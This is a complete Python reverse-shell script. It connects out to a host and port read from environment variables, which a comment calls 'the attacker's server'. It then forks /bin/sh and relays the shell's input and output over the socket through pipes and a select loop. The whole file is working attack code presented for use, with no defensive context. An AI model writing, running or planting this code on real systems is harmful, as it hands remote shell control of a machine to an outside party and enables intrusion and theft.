import os
import sys
import socket
import select

def forward_data(src_fd, dst_fd):
    try:
        data = os.read(src_fd, 1024)
        if data:
            os.write(dst_fd, data)
        else:
            # No data means the other end has closed the connection
            return False
    except OSError as e:
        print(f"Error while forwarding data: {e}")
        sys.exit(1)
    return True

def main():
    # Read server IP and port from environment variables
    SERVER_IP = os.getenv("REVERSE_SHELL_SERVER", "127.0.0.1")
    SERVER_PORT = int(os.getenv("REVERSE_SHELL_PORT", "4444"))

    try:
        # Create a socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect to the attacker's server
        sock.connect((SERVER_IP, SERVER_PORT))

        # Create two pipes for bidirectional communication
        parent_to_child, child_to_parent = os.pipe(), os.pipe()

        # Fork the process
        pid = os.fork()
        if pid == 0:
            # Child process
            os.close(parent_to_child[1])  # Close the write end of parent-to-child pipe
            os.close(child_to_parent[0])  # Close the read end of child-to-parent pipe

            # Redirect stdin, stdout, and stderr to the pipes
            os.dup2(parent_to_child[0], sys.stdin.fileno())
            os.dup2(child_to_parent[1], sys.stdout.fileno())
            os.dup2(child_to_parent[1], sys.stderr.fileno())

            # Close the duplicated file descriptors
            os.close(parent_to_child[0])
            os.close(child_to_parent[1])

            # Execute a shell
            # subprocess.call(["/bin/sh", "-i"])
            os.execl("/bin/sh", "-i")
        else:
            # Parent process
            os.close(parent_to_child[0])  # Close the read end of parent-to-child pipe
            os.close(child_to_parent[1])  # Close the write end of child-to-parent pipe

            # Use select to multiplex between the socket and the pipes
            while True:
                rlist, _, _ = select.select([sock, child_to_parent[0]], [], [])
                for r in rlist:
                    if r == sock:
                        if not forward_data(sock.fileno(), parent_to_child[1]):
                            return
                    elif r == child_to_parent[0]:
                        if not forward_data(child_to_parent[0], sock.fileno()):
                            return

    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()